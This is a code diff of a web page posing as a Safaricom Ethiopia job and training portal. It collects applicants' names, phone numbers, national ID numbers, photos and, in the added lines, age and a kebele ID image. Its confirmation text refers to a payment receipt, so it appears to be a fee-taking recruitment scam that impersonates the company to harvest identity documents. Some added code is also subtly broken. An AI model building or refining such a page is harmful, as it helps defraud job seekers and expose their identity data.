@@ -6,7 +6,7 @@
     <title>Safaricom Ethiopia - Job & Training Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        :root { --saf-red: #e60000; --gradient: linear-gradient(135deg, #e60000 0%, #8b0000 100%); }
+        :root { --saf-red: #e60000; --saf-green: #00FF00; --gradient: linear-gradient(135deg, #e60000 0%, #8b0000 100%); }
         body { font-family: 'Segoe UI', 'Ubuntu', sans-serif; background: #f8f9fa; margin: 0; padding: 10px; color: #333; }
         .container { background: #fff; max-width: 800px; margin: 20px auto; padding: 35px; border-radius: 25px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); border-top: 12px solid var(--saf-red); }
         h2, h3 { text-align: center; color: #222; margin-bottom: 10px; }
@@ -22,6 +22,8 @@
         .success-box { text-align: center; display: none; }
         #userPhotoPreview { width: 170px; height: 170px; object-fit: cover; border-radius: 15px; border: 5px solid #f0f0f0; margin-bottom: 20px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); }
         .lang-card { background: #f9f9f9; padding: 20px; border-radius: 15px; margin-top: 20px; text-align: justify; border: 1px solid #eee; line-height: 1.7; }
+        .certificate-container { border: 2px solid var(--saf-green); padding: 10px; border-radius: 10px; margin-bottom: 15px; text-align: center; }
+        .certificate-container p { font-size: 18px; color: var(--saf-green); font-weight: bold; }
         @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
@@ -33,7 +35,7 @@
         <h2>ሳፋሪኮም ኢትዮጵያ</h2>
         <h3>የገጠር ማስፋፊያ የሥራና ሥልጠና ሀገራዊ ጥሪ</h3>
         <div class="hero">
-            <p><strong>ክቡራን አመልካቾች፤</strong> ሳፋሪኮም ኢትዮጵያ ከሥራና ክህሎት ሚኒስቴር ጋር በመተባበር የዲጂታል ኢትዮጵያን ራዕይ እውን ለማድረግና የዜጎችን ሕይወት በቴክኖሎጂ ለመለወጥ ታላቅ ሀገራዊ ፕሮጀክት ቀርጿል። ይህ ፕሮጀክት የቴሌኮም አገልግሎቱን ወደ እያንዳንዱ የኢትዮጵያ ገጠር መንደሮች ለማድረስ ያለመ ነው።</p>
+            <p><strong>ለአመልካቾች ፤</strong> ሳፋሪኮም ኢትዮጵያ ከሥራና ክህሎት ሚኒስቴር ጋር በመተባበር የዲጂታል ኢትዮጵያን ራዕይ እውን ለማድረስና የዜጎችን ሕይወት በቴክኖሎጂ ለመለወጥ ታላቅ ሀገራዊ ፕሮጀክት ቀርጿል። ይህ ፕሮጀክት የቴሌኮም አገልግሎቱን ወደ እያንዳንዱ የኢትዮጵያ ገጠር መንደሮች ለማድረስ ያለመ ነው።</p>
             <p>በመሆኑም በቴክኖሎጂው ዘርፍ የላቀ ፍላጎት ያላችሁና የወደፊት የኩባንያው የጀርባ አጥንት ለመሆን የምትተጉ ወጣቶች የዚህ ታሪካዊ ጉዞ አካል እንድትሆኑ ተጋብዛችኋል። ብቁ ሆነው ለሚገኙ አመልካቾች በዘርፉ ዓለም አቀፍ ደረጃውን የጠበቀ የክህሎት ሥልጠና የሚሰጥ ሲሆን፣ ሥልጠናውን በስኬት ለሚያጠናቅቁ ወጣቶች በሳፋሪኮም ኢትዮጵያ ውስጥ ቀጥታ የሥራ ቅጥር ይፈጸምላቸዋል።</p>
             <button class="btn-next" onclick="startForm()">ምዝገባ ለመጀመር እዚህ ይጫኑ / Apply Now</button>
         </div>
@@ -44,10 +46,25 @@
             <h3 style="color:var(--saf-red)">ደረጃ 1፡ የግል መረጃ</h3>
             <div class="grid">
                 <div><label>ሙሉ ስም ከነአባቱ *</label><input id="full_name" required></div>
-                <div><label>ጾታ *</label><select id="gender" required><option value="">ይምረጡ...</option><option>ወንድ</option><option>ሴት</option></select></div>
+                <div><label>ጾታ *</label>
+                    <select id="gender" required>
+                        <option value="">ይምረጡ...</option>
+                        <option>ወንድ</option>
+                        <option>ሴት</option>
+                    </select>
+                </div>
+                <div><label>እድሜ *</label>
+                    <select id="age" required>
+                        <option value="">እድሜ ይምረጡ...</option>
+                        <option>ከ18 - 25</option>
+                        <option>ከ26 - 35</option>
+                        <option>ከ36 በላይ</option>
+                    </select>
+                </div>
                 <div><label>ስልክ ቁጥር *</label><input id="phone" type="tel" required></div>
                 <div><label>የፋይዳ (ልዩ መታወቂያ) ቁጥር *</label><input id="fayda_id" required></div>
                 <div style="grid-column: 1 / -1;"><label>የግል ፎቶ (4x4 ለመለያ) *</label><input type="file" id="p_photo" accept="image/*" required onchange="previewImage(this)"></div>
+                <div style="grid-column: 1 / -1;"><label>የቀበሌ መታወቂያ (4x4 ለመለያ) *</label><input type="file" id="keb_photo" accept="image/*" required onchange="previewKebImage(this)"></div>
             </div>
         </div>
 
@@ -97,15 +114,20 @@
 
     <div id="success" class="success-box">
         <img id="userPhotoPreview" src="" alt="User Photo">
+        <h1 style="color:var(--saf-red); margin:0;">Congratulations</h1>
         <h1 style="color:var(--saf-red); margin:0;">እንኳን ደስ አለዎት!</h1>
         <h2 id="finalName" style="margin:10px 0; font-size:30px;"></h2>
         
+        <div class="lang-cardCertificate-container">
+            <p> የትምህርት certifica አይነት </p>
+        </div>
+
         <div class="lang-card">
-            <p><strong>አማርኛ፦</strong> ያቀረቡት መረጃ፣ የትምህርት ማስረጃ እና የክፍያ ደረሰኝ በቴክኒክ ኮሚቴው አማካኝነት በጥንቃቄ እየተጣራ ይገኛል። የመረጃ ማጣራቱ ሂደት እንደተጠናቀቀና ብቁ ሆነው ሲገኙ፣ ለቀጣይ ሥልጠና እና የሥራ ስምሪት በስልክ ቁጥርዎ አጭር የጽሁፍ መልዕክት (SMS) ይላክልዎታል።</p>
+            <p><strong>፦</strong> ያቀረቡት መረጃ፣ የትምህርት ማስረጃ እና የክፍያ ደረሰኝ በቴክኒክ ኮሚቴው አማካኝነት በጥንቃቄ እየተጣራ ይገኛል። የመረጃ ማጣራቱ ሂደት እንደተጠናቀቀና ብቁ ሆነው ሲገኙ፣ ለቀጣይ ሥልጠና እና የሥራ ስምሪት በስልክ ቁጥርዎ አጭር የጽሁፍ መልዕክት (SMS) ይላክልዎታል።</p>
         </div>
         
         <div class="lang-card" style="direction: ltr;">
-            <p><strong>English:</strong> Your application, educational credentials, and payment receipt are currently being verified by our technical committee. Once the verification is complete and your eligibility is confirmed, you will receive an SMS regarding the next steps for training and deployment.</p>
+            <p><strong>:</strong> Your application, educational credentials, and payment receipt are currently being verified by our technical committee. Once the verification is complete and your eligibility is confirmed, you will receive an SMS regarding the next steps for training and deployment.</p>
         </div>
         
         <button class="btn-next" style="margin-top:30px;" onclick="location.reload()">ጨርስ / Finish</button>
@@ -123,6 +145,14 @@
         if (input.files && input.files[0]) {
             const reader = new FileReader();
             reader.onload = function(e) { document.getElementById('userPhotoPreview').src = e.target.result; };
+            reader.readAsDataURL(input.files[0]);
+        }
+    }
+
+    function previewKebImage(input) {
+        if (input.files && input.files[0]) {
+            const reader = new FileReader();
+            reader.onload = function(e) { document.getElementById('keb_photo').src = e.target.result; };
             reader.readAsDataURL(input.files[0]);
         }
     }
@@ -154,6 +184,7 @@
             fayda_id: document.getElementById("fayda_id").value,
             phone: document.getElementById("phone").value,
             gender: document.getElementById("gender").value,
+            age: document.getElementById("age").value,
             region: document.getElementById("region").value,
             zone: document.getElementById("zone").value,
             woreda: document.getElementById("woreda").value,
